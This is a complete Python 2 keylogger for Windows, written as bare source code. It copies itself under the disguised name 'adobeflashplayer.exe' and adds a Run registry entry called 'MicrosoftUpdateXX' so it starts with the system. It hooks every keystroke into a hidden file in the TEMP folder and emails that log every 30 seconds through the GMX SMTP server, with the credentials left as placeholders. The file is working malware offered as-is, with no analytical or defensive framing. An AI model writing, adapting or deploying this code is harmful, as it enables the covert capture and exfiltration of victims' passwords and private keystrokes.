import pythoncom
import pyHook
from os import path
import urllib, urllib2
import win32com.client
import win32event, win32api, winerror
from _winreg import *
import shutil
import sys
import datetime
import os, random, smtplib, string, time, threading
from email.mime.text import MIMEText

global logfile

def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

temp_path = os.getenv('TEMP')
logfile = temp_path + "\\" + id_generator(15)

f = open(logfile,"a")
f.write("")
f.close()

ironm = win32event.CreateMutex(None, 1, 'NOSIGN')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    ironm = None
    print "nope"
    sys.exit()

dir = r"C:\Users\Public\Libraries\adobeflashplayer.exe"

def startup():
    shutil.copy(sys.argv[0], dir)
    aReg = ConnectRegistry(None, HKEY_CURRENT_USER)
    aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
    SetValueEx(aKey,"MicrosoftUpdateXX", 0, REG_SZ, dir)    
if not path.isfile(dir):
    startup()   


def keylogger():
    def OnKeyboardEvent(event):
        if event.Ascii != 0 or 8:
            f = open(logfile,"a")
            keylogs = chr(event.Ascii)
            if event.Ascii == 13:
                keylogs = "\n"
            f.write(keylogs)
            f.close()

    hm = pyHook.HookManager()
    hm.KeyDown = OnKeyboardEvent
    hm.HookKeyboard()
    pythoncom.PumpMessages()


def mailsender():
    username = 'xxxx'
    password = 'xxxx'

    mittente = 'xxxx'
    ricevente = 'xxxxx'

    while 1:
        time.sleep(30)
        fo = open(logfile, "r")
        msg = MIMEText(fo.read())
        fo.close()
        
        timeInSecs = datetime.datetime.now()
        msg['Subject'] = 'Log: ' + timeInSecs.isoformat()
        msg['From'] = mittente
        msg['To'] = ricevente

        try:
            s = smtplib.SMTP('smtp.gmx.com:25')
            s.login(username,password)
            s.sendmail(mittente, [ricevente], msg.as_string())
            s.close()
            print "Successfully sent email"
        except Exception, a:
            print a


if __name__ == '__main__':
	thread1 = threading.Thread(name="sic1", target=keylogger)
	thread2 = threading.Thread(name="sic2", target=mailsender)

	thread1.start()
	thread2.start()